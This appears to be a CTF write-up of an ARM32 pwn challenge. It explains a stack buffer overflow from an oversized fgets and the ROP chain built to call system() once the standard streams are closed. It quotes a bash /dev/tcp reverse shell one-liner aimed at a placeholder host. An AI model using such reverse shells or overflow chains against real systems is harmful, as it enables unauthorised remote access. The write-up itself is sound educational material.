## Lengan


:::info
**TL;DR**: This was a pwn challenge using a ROP chain. We were provided with the address to a server and the binary which run on it. The point of exploitation was a simple unchecked user-input, with the real challenge being that all standard streams were closed. Opening up a remote shell to another server got us what we wanted.
:::


### First look

Before we hack away on our binary, we will first need to take a better look at it. Two common tools for this job are `file(1)` and [`checksec(1)`](https://github.com/slimm609/checksec.sh)

```
> file main_fixed
main_fixed: ELF 32-bit LSB executable, ARM, EABI5 version 1 (GNU/Linux), statically linked, BuildID[sha1]=bbba9cc93bb8366814ab20761eb8447eafe08ee4, for GNU/Linux 3.2.0, not stripped

> checksec --file=main_fixed
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   3937) Symbol  No	0		0		main
```

What's interesting is that this is an aarch32 binary - normally these challenges are just x86 as it is the most common ISA for "normal" computing. This also is what got me initially hooked to this challenge as I'm quite familiar with ARM but a novice in x86 assembly. Note here that this binary is not stripped, so we will be greeted with function and variables names along the way. This makes it a bit easier to understand its internals.

As expected we will have to deal with a non-executable stack and stack-cannaries (luckily as it turns out, this was rare).

Executing the binary (or connecting to the provided server) using `qemu-user(1)` (or `nc(1)`) we get a single timestamp looking number. The program will then wait for user input and close cleanly afterwards.

```bash
> qemu-arm main_fixed
1688129215
Hello  # our input
> echo $?
0
```

With the simple things out of the way, let's dig deeper.


### Inspecting the binary

We knew that the binary accepts an input and then quits. As this is still a CTF the
solution had probably something to do with that. A powerful tool to look behind the
curtain of a compiled (or assembled) application is a decompiler (or disassembler).
There are many decompilers and disassembler for machine byte code, but the (cheap)
choice we used here is Ghidra. There are many tutorials out there on how to use
Ghidra, so I'll skip the introduction here and go fully into it.

As it turns out, the actual logic is very simple. Below is essentially the whole code
(comments are ours)

```c=
void sice(void)
{
  // set stdin and stdout to unbuffered mode (here _IONBF = 2).
  setvbuf((FILE *)stdout,(char *)0x0,2,0);  // see `setbuf(3)`
  setvbuf((FILE *)stdin,(char *)0x0,2,0);
  // print out current TS to stdout
  system("date +\'%s\'");  // see `system(3)`
  return;
}

void vuln(void)
{
  char buffer [32];
 
  // read 4KiB from stdin and store it in 32B buffer ↯
  fgets(buffer,0x1000,(FILE *)stdin);  // see `fgetc(3)`

  // close all standard streams
  // commonly stdin is on filepointer 0, stdout on 1 and stderr on 2 
  close(0);  // see `close(2)`
  close(1);
  close(2);
  return;
}

// undefined4 is a Ghidra macro for `unknown type with 4B length`
undefined4 main(void)
{
  sice();
  vuln();
  return 0;
}
```

The fist step to exploitation is obvious from this. Using `fgets` in line 16 is
praiseworthy - or at least it would be if the given size of the buffer wouldn't be so
completely off. We are allowed in this program to write 4KiB into a 32B buffer before
we get into trouble. As `buffer` is in the stack, we can provoke a buffer overflow
under our terms, which will be the entry point for our exploit.

But before we started that, we looked around a bit in order to know what we're up
against. I have mentioned above, that there are stack canaries in this binary, but
luckily for us these are limited to the statically linked parts of the libc. The
above methods in turn are not protected.

:::info
There is not a clear fault prove way too check for stack canaries in a given function
as it depends on the system, supported ISA, compiler, … used. It often helps to look
into assembly and the decompiled code (at least in Ghidra). In our case the
`__stack_check_fail` function and `__stack_chk_guard` global variable were in the
non-stripped binary, which made it easy as it produced obvious code like this:
```c
if (local_1c != &__stack_chk_guard) { /* WARNING: Subroutine does not return */
  __stack_chk_fail(local_32c);
}
```
:::


### Designing the exploit

With most parameters known, we can draft an idea for the exploit. Be warned thoo:
this solution was the result of a lot of trial and error. On the way we learned a lot
about the system and its environment, slowly building the knowledge for the final
exploit. But don't be too frustrated if you can seemingly only hit walls while on a
similar challenge.

So let's start. We will be building a [ROP (Return-Oriented
Programming)](https://en.wikipedia.org/wiki/Return-oriented_programming) chain here.
It's an exploit technique that allows one to execute code even in the face of
security mitigations like non-executable stacks. The basic idea is simple: instead of
writing our assembled code into the stack, we build a chain of addresses into the
code section that in sum will do our biding. This works, because the stack is build
up from higher address to lower ones, whereas we write onto it in reverse order. This
means for us, that if we have a way to write an arbitrary length of bytes onto it, we
can overwrite the return address of the current stack frame and redirect the program
flow according to our will.

<a title="R. S. Shaw, Public domain, via Wikimedia Commons" href="https://commons.wikimedia.org/wiki/File:Call_stack_layout.svg"><img width="512" alt="Call stack layout" src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d3/Call_stack_layout.svg/512px-Call_stack_layout.svg.png"></a>

:::warning
Our way of exploiting the system isn't the only one. The solution by the creators of
the CTF essentially build their own system calls in order to execute `socket` and
`exec`. We didn't go this route - which probably made it harder than strictly
necessary. But you'll see…
:::

As we can see in the above code, we have a call to `system(3)`. This function
essentially executes a shell command in a forked process, while redirecting its
output to the standard streams. The return value of `system` in this case is a 16bit
value, with the upper 8 bits being the return value of the executed shell command,
and the lower 8 bits the return value of `system` itself.

This could have been very easy here, but sadly at the point we take control, the
standard streams have already been closed. We tried for a few hours to reopen them
(which worked fine locally), but we had no such luck on the remote server. It was
probably in the way the command was called there, but the standard way of going
through `/dev/pts/X` or similar didn't work.

That also meant that we didn't get any feedback if the call to `system` even worked.
Leaving us in the dark on whether the command failed, the referenced binary didn't
exist or our chain was broken or something in the transmission got garbled. This was
especially an issue as calls to `wget`, `nc`, `dig` or similar tools seemingly did
not work on the remote.

One thing in this darkness worked though: If the program crashed due to a `SIGSEGV`
or `SIGABRT` the wrapper script would inform us about it. So we did what our
sleep-deprived brain came up with at 4 o'clock in the morning: If `system` returned
without error, the program would exit cleanly (we had `exit(3)` at our disposal). And
in all other cases it should just throw a `SIGSEGV` or `SIGABRT` - whatever was
easier.

### Building the exploit

As mentioned above, ROP chains work by having a chain of addresses we should jump
into which in summary do what we want. Behind these addresses are snippets of
instruction - also called gadgets - that are already contained in our binary. These
can be found using [ROPGadget](https://github.com/JonathanSalwan/ROPgadget). We had
for example a very easy thumb32 gadget at our hands which would write register `r3`
and then allowed us to specify the next location (by writing the `pc` or program
counter):

```
$ ROPgadget --binary main_fixed --thumb
...
0x00014c28 : pop {r3, pc}
...
```

Sadly these easy gadgets which only change one value are sometimes quite rare, with
the best solution doing multiple things at once. If this is the case, building a
chain essentially evolves into a big puzzle game. This was the case for us and tbqh
it was really enjoyable. ^^

The goal of our puzzle game was essentially to prepare our arguments for the
above-mentioned functions. If you're familiar with assembly you might know, that ISAs
often (if not always [I'm honestly not sure]) define a [calling
convention](https://en.wikipedia.org/wiki/Calling_convention) which specifies how
calls to subroutines or functions should be made on a very low level. For example for
us this meant, that we needed to prepare the following registers:

1. `system`
  - register `r0` is a pointer to a null-terminated char array
  - register `lr` contains address where we should resume after function return
2. `exit`
  - register `r0` is our exit status as an integer

Writing a value into `r0` or `lr` is pretty easy, there are enough gadgets for that.
But writing a pointer with our command-string into `r0` is not directly trivial. The
problem is, that we would first need to write our string into a __known__ address
before writing it into `r0`.

Luckily for us, we could derive our current stack pointer address from the register
content when we start our exploitation. For some reason did the register `r6` contain
an address which had a static offset to our current location stack pointer. We first
tried overwriting the location it pointed to, but as it turns out the `system`
function will crash silently, if the string containing the current env variables is
garbled trash - ups. So we just added an offset to this address so that it pointed to
our command string (using `add`). Writing this string/`char*` into the stack is
trivial, as we can just add it at the end of our ROP chain.

With this solved, we only needed to program to crash if something with `system` went 
wrong. As it turns out, this was the largest part of our ROP chain, but as we only
needed it for debug purposes I won't detail it here.

### Finding the flag

With all of this we were able to figure out that bash tcp was available. Looking into
one of the many [Reverse Shell cheat
sheets](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/0a75beeccdb714fce2645507a7d5ee8e4a25f0bf/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
we used `bash -i >& /dev/tcp/ADDR/PORT 0>&1` (see `bash(1)`) in order to obtain a
remote shell to the pwned server and get content out of it. The rest from here was
easy, and we found the flag in the `./flag.txt` file.

Sadly the server isn't online anymore, and we didn't write down the flag. So no flag
statement at the end here.

